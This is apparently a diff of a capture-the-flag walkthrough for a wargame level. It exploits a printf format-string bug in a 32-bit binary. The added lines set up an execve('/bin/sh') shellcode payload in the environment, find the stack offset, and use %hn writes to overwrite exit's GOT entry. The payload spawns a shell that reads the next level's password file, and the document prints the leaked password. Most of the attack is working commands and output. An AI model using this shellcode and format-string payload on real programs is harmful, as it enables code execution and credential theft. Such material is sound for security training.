@@ -1,62 +1,59 @@
-Dump of assembler code for function main:
-   0x08048444 <+0>:	push   ebp
-   0x08048445 <+1>:	mov    ebp,esp
-   0x08048447 <+3>:	push   edi
-   0x08048448 <+4>:	push   ebx
-   0x08048449 <+5>:	and    esp,0xfffffff0
-   0x0804844c <+8>:	sub    esp,0x90
-   0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0
+gdb> disass main
+[...]
    0x0804845d <+25>:	mov    eax,ds:0x80497f0           ; stdin
    0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
-   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64   ; 100
+   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
    0x0804846e <+42>:	lea    eax,[esp+0x28]
    0x08048472 <+46>:	mov    DWORD PTR [esp],eax
-   0x08048475 <+49>:	call   0x8048350 <fgets@plt>      ; fgets(buff, 100, stdin)
-   0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
-   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
-   0x08048487 <+67>:	lea    eax,[esp+0x28]
-   0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
-   0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
-   0x08048495 <+81>:	cmp    al,0x40
-   0x08048497 <+83>:	jle    0x80484cb <main+135>
-   0x08048499 <+85>:	lea    eax,[esp+0x28]
-   0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
-   0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
-   0x080484a7 <+99>:	cmp    al,0x5a
-   0x080484a9 <+101>:	jg     0x80484cb <main+135>
-   0x080484ab <+103>:	lea    eax,[esp+0x28]
-   0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
-   0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
-   0x080484b9 <+117>:	mov    edx,eax
-   0x080484bb <+119>:	xor    edx,0x20
-   0x080484be <+122>:	lea    eax,[esp+0x28]
-   0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
-   0x080484c9 <+133>:	mov    BYTE PTR [eax],dl
-   0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1
-   0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c]
-   0x080484da <+150>:	lea    eax,[esp+0x28]
-   0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
-   0x080484e6 <+162>:	mov    edx,eax
-   0x080484e8 <+164>:	mov    eax,0x0
-   0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
-   0x080484f1 <+173>:	mov    edi,edx
-   0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
-   0x080484f5 <+177>:	mov    eax,ecx
-   0x080484f7 <+179>:	not    eax
-   0x080484f9 <+181>:	sub    eax,0x1
-   0x080484fc <+184>:	cmp    ebx,eax
-   0x080484fe <+186>:	jb     0x8048487 <main+67>
+   0x08048475 <+49>:	call   0x8048350 <fgets@plt>      ; fgets(buffer, 100, stdin)
+[...]
    0x08048500 <+188>:	lea    eax,[esp+0x28]
    0x08048504 <+192>:	mov    DWORD PTR [esp],eax
-   0x08048507 <+195>:	call   0x8048340 <printf@plt>
+   0x08048507 <+195>:	call   0x8048340 <printf@plt>     ; printf(buffer)
    0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
-   0x08048513 <+207>:	call   0x8048370 <exit@plt>     ; exit(0)
+   0x08048513 <+207>:	call   0x8048370 <exit@plt>       ; exit(0)
 End of assembler dump.
+# Here we can see that the program call `fgets` then call `printf` with whatever we previously entered
 
-https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf
+# We will use a format string attack to overwrite the exit function call with a shellcode in the env
+gdb> disass 0x8048370
+[...]
+   0x08048370 <exit@plt+0>:	jmp    DWORD PTR ds:0x80497e0
+   0x08048376 <exit@plt+6>:	push   0x18
+   0x0804837b <exit@plt+11>:	jmp    0x8048330
+[...]
+gdb> x 0x80497e0
+0x80497e0 <exit@got.plt>
 
-disass main
-disass 0x8048370
+# Then we export our shellcode
+$> export SHELLCODE=$(python -c "print '\x90' * 64 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
+gdb> x/s *((char**)environ)
+0xffffd903:	 "SHELLCODE=[...]"
+# Our shellcode is at address 0xffffd903 + 10 == 0xffffd90d
 
-export SHELLCODE=$(python -c "print '\x90' * 64 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
-(python -c "print '\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08' + '%x%x%x%x%x%x%x%x%55505x%hn%9967x%hn'" ; cat -) | ./level05
+# Then let's find at which offset our string is stored
+$> python -c "print 'aaaa' + ' %x ' * 16" | ./level05
+aaaa 64  f7fcfac0  f7ec3af9  ffffd70f  ffffd70e  0  ffffffff  ffffd794  f7fdb000  61616161  20782520  20782520  20782520  20782520  20782520  20782520
+# Here we find 'aaaa' == 0x61616161 at offset 10
+
+# Now we want to set the 4 lower bytes then the 4 higher bytes of the exit function call to match the address of our shellcode
+$> python -c "print '\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08' + '%x' * 8 + '%0x%hn'" > /tmp/pl5
+gdb> r < /tmp/pl5
+Stopped reason: SIGSEGV
+0x08040040 in ?? ()
+(0xd90d - 0x0040) + 1
+55502
+
+$> python -c "print '\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08' + '%x' * 8 + '%55502x%hn%0x%hn'" > /tmp/pl5
+Stopped reason: SIGSEGV
+0xd915d90c in ?? ()
+(0xffff - 0xd915) + 8
+9970
+
+# Now lets tweak the value to jump right in the nopsled
+$> (python -c "print '\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08' + '%x' * 8 + '%55502x%hn%9970x%hn'" ; cat -) | ./level05
+$> (python -c "print '\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08' + '%x' * 8 + '%55503x%hn%9969x%hn'" ; cat -) | ./level05
+$> (python -c "print '\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08' + '%x' * 8 + '%55504x%hn%9968x%hn'" ; cat -) | ./level05
+$> (python -c "print '\xe0\x97\x04\x08JUNK\xe2\x97\x04\x08' + '%x' * 8 + '%55505x%hn%9967x%hn'" ; cat -) | ./level05
+$ cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
